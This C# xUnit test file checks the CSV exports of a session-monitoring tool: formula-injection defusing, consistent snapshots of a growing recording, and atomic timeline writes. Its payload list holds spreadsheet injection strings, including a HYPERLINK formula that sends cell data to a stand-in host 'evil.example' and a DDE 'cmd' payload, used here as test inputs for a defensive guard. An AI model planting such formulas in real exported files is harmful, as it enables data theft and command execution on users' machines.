using System.Globalization;
using System.Text;
using EucLens.Core;
using Xunit;

namespace EucLens.Tests;

/// <summary>
/// The session recording CSV and the timeline CSV: spreadsheet formula protection of recorded text, one consistent snapshot for the header and the rows
/// of a recording that is still growing, and atomic writing of the timeline file.
/// </summary>
public sealed class CsvExportSafetyTests
{
    private static string TempDirectory()
    {
        var dir = Path.Combine(Path.GetTempPath(), "euclens-csv-safety-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        return dir;
    }

    private static async Task<List<List<string>>> ExportAsync(Func<IEnumerable<SessionSnapshot>> samples)
    {
        var dir = TempDirectory();
        try
        {
            var path = Path.Combine(dir, "r.csv");
            await RecordingExport.ExportCsvAsync(path, samples);
            Assert.Equal(["r.csv"], Directory.GetFiles(dir).Select(Path.GetFileName));
            return Read(await File.ReadAllTextAsync(path));
        }
        finally { Directory.Delete(dir, true); }
    }

    /// <summary>The recording CSV ends lines with the platform's newline; the reader splits on CRLF, and a leading byte-order mark is not part of the first cell. No test text contains a line break.</summary>
    private static List<List<string>> Read(string csv) =>
        FindingsExportTests.Parse(csv.TrimStart('\uFEFF').Replace("\r\n", "\n", StringComparison.Ordinal).Replace("\n", "\r\n", StringComparison.Ordinal));

    private static bool IsNumber(string cell) => double.TryParse(cell, NumberStyles.Float, CultureInfo.InvariantCulture, out _);

    // ---------- formula protection ----------

    public static TheoryData<string> Payloads => new()
    {
        "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"click\")", "+SUM(A1:A9)", "-1+2", "@SUM(1,1)", "=cmd|' /C calc'!A0", " =1+1", "\t=1+1", " +1", "＝1+1"
    };

    /// <summary>A sample whose every recorded text field carries the payload.</summary>
    private static SessionSnapshot Hostile(string payload)
    {
        var s = TestSamples.Make(0);
        var rtt = s.BlastMetrics!["rtt"] with { Unit = payload, Source = payload };
        return s with
        {
            Session = s.Session with { ProtocolDetection = payload },
            Graphics = s.Graphics with { Encoder = payload, Codec = payload, Mode = payload, Resolution = payload },
            Gpu = s.Gpu with { Model = payload, DriverVersion = payload },
            CollectionStatus = payload,
            BlastMetrics = new Dictionary<string, Metric>(s.BlastMetrics) { ["rtt"] = rtt },
            HostMetrics = [new("gpu.model", MetricCategory.Gpu, "GPU model", rtt, payload)],
        };
    }

    [Theory]
    [MemberData(nameof(Payloads))]
    public async Task RecordedTextThatCouldBeAFormulaIsDefusedInEveryTextColumnOfTheRecordingCsv(string payload)
    {
        var rows = await ExportAsync(() => [Hostile(payload)]);
        var header = rows[0]; var data = rows[1];
        Assert.Equal(header.Count, data.Count);
        // No cell a spreadsheet could read as a formula remains, except numbers (a negative number is a number).
        Assert.DoesNotContain(data, cell => CsvField.NeedsFormulaGuard(cell) && !IsNumber(cell));
        // The protected text is otherwise exactly as recorded.
        var expected = "'" + payload;
        var protectedColumns = header.Select((h, i) => (h, i)).Where(x => data[x.i] == expected).Select(x => x.h).ToArray();
        foreach (var column in new[] { "encoder", "codec", "graphics_mode", "resolution", "gpu_model", "driver", "collection_status", "protocol_detection",
                                       "blast_rtt_unit", "blast_rtt_source", "host_gpu.model", "host_gpu.model_unit", "host_gpu.model_source" })
            Assert.Contains(column, protectedColumns);
    }

    [Fact]
    public async Task NumbersAreNeverPrefixedSoANegativeValueStaysANumber()
    {
        var s = TestSamples.Make(0);
        s = s with { System = s.System with { DiskActivity = new Metric(-2.5, "MB/s") } };
        var rows = await ExportAsync(() => [s]);
        Assert.Equal("-2.5", rows[1][rows[0].IndexOf("disk_mbps")]);
    }

    [Fact]
    public async Task OrdinaryTextIsWrittenExactlyAsBefore()
    {
        var rows = await ExportAsync(() => [TestSamples.Make(0)]);
        var data = rows[1]; var header = rows[0];
        Assert.Equal("REAL SESSION · 2/3 counters available", data[header.IndexOf("collection_status")]);
        Assert.Equal("ms", data[header.IndexOf("blast_rtt_unit")]);
        Assert.DoesNotContain(data, cell => cell.StartsWith('\''));
    }

    // ---------- one snapshot for the header and the rows ----------

    [Fact]
    public async Task ARecordingThatGrowsBetweenTheTwoPassesNeverGivesRowsMoreColumnsThanTheHeader()
    {
        var first = TestSamples.Make(0); var second = TestSamples.Make(1);
        // The sample that arrives while the export is running brings a counter the header pass never saw.
        var late = TestSamples.Make(2);
        late = late with { BlastMetrics = new Dictionary<string, Metric>(late.BlastMetrics!) { ["lateCounter"] = late.BlastMetrics!["rtt"] } };
        var calls = 0;
        IEnumerable<SessionSnapshot> Source() => ++calls == 1 ? [first, second] : [first, second, late];

        var rows = await ExportAsync(Source);

        Assert.Equal(2, calls);                                                   // the export reads the source twice, as before
        Assert.Equal(3, rows.Count);                                              // header + the two samples of the snapshot, not the late one
        Assert.All(rows, row => Assert.Equal(rows[0].Count, row.Count));
        Assert.DoesNotContain(rows[0], h => h.Contains("lateCounter", StringComparison.Ordinal));
    }

    [Fact]
    public async Task AGrowingPersistedRecordingExportsOneConsistentSnapshot()
    {
        // The real source: samples streamed from disk while the recorder keeps writing.
        var directory = TempDirectory();
        try
        {
            var storage = new MemoryStorage();
            var writer = new RecordingWriter(() => new RecordingOptions { Directory = "grow", QuotaBytes = 64L << 20, SegmentBytes = 64 << 10, MinimumFreeBytes = 0,
                FlushInterval = TimeSpan.FromMilliseconds(20), CompressClosedParts = false }, storage);
            var recorder = new SessionRecorder(writer);
            recorder.Start();
            for (var i = 0; i < 20; i++) recorder.Add(TestSamples.Make(i));
            var path = Path.Combine(directory, "grow.csv");
            var export = recorder.ExportCsvAsync(path);
            for (var i = 20; i < 400; i++) recorder.Add(TestSamples.Make(i, blast: i % 3 != 0));
            await export;
            await recorder.StopAsync();

            var rows = Read(await File.ReadAllTextAsync(path));
            Assert.True(rows.Count >= 21);
            Assert.All(rows, row => Assert.Equal(rows[0].Count, row.Count));
            var stamps = rows.Skip(1).Select(r => r[0]).ToArray();
            Assert.Equal(stamps.Distinct().Count(), stamps.Length);                // in order, none twice
        }
        finally { Directory.Delete(directory, true); }
    }

    // ---------- the timeline CSV is written atomically ----------

    private static async Task<LoadedHistory> TimelineHistoryAsync()
    {
        var rec = await HistoryFixture.RecordAsync(40, step: async (i, c) =>
        {
            if (i == 20) await c.MarkIncidentAsync();
            if (i == 25) c.Mark(RecordingMarkKind.Note, "  =HYPERLINK(\"x\")");
        }, compress: false);
        return HistoryFixture.Load(rec.Storage, rec.ShortId);
    }

    [Fact]
    public async Task TheTimelineCsvIsWrittenAsUtf8WithoutAByteOrderMarkAndLeavesNoTemporaryFile()
    {
        var history = await TimelineHistoryAsync();
        var dir = TempDirectory();
        try
        {
            var path = Path.Combine(dir, "timeline.csv");
            await HistoryExport.WriteTimelineCsvAsync(path, history, null, TimeZoneInfo.Utc);
            var bytes = await File.ReadAllBytesAsync(path);
            Assert.NotEqual(0xEF, bytes[0]);                                                                  // no byte-order mark, as before
            Assert.Equal(HistoryExport.TimelineCsv(history, null, TimeZoneInfo.Utc), new UTF8Encoding(false, true).GetString(bytes));
            Assert.Equal(["timeline.csv"], Directory.GetFiles(dir).Select(Path.GetFileName));
            await HistoryExport.WriteTimelineCsvAsync(Path.Combine(dir, "incidents.csv"), history, null, TimeZoneInfo.Utc, incidentsOnly: true);
            Assert.True(File.ReadAllLines(Path.Combine(dir, "incidents.csv")).Length < File.ReadAllLines(path).Length);
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public async Task ACancelledOrFailedTimelineExportLeavesThePreviousFileAndNoTemporaryFile()
    {
        var history = await TimelineHistoryAsync();
        var dir = TempDirectory();
        try
        {
            var path = Path.Combine(dir, "timeline.csv");
            await File.WriteAllTextAsync(path, "previous content");
            using var cts = new CancellationTokenSource(); cts.Cancel();
            await Assert.ThrowsAnyAsync<OperationCanceledException>(() => HistoryExport.WriteTimelineCsvAsync(path, history, null, TimeZoneInfo.Utc, cancellationToken: cts.Token));
            Assert.Equal("previous content", await File.ReadAllTextAsync(path));
            await Assert.ThrowsAnyAsync<IOException>(() => HistoryExport.WriteTimelineCsvAsync(Path.Combine(dir, "missing-folder", "t.csv"), history, null, TimeZoneInfo.Utc));
            Assert.Equal(["timeline.csv"], Directory.GetFiles(dir).Select(Path.GetFileName));
            await HistoryExport.WriteTimelineCsvAsync(path, history, null, TimeZoneInfo.Utc);                  // success replaces it completely
            Assert.StartsWith(HistoryExport.Header, await File.ReadAllTextAsync(path));
        }
        finally { Directory.Delete(dir, true); }
    }
}
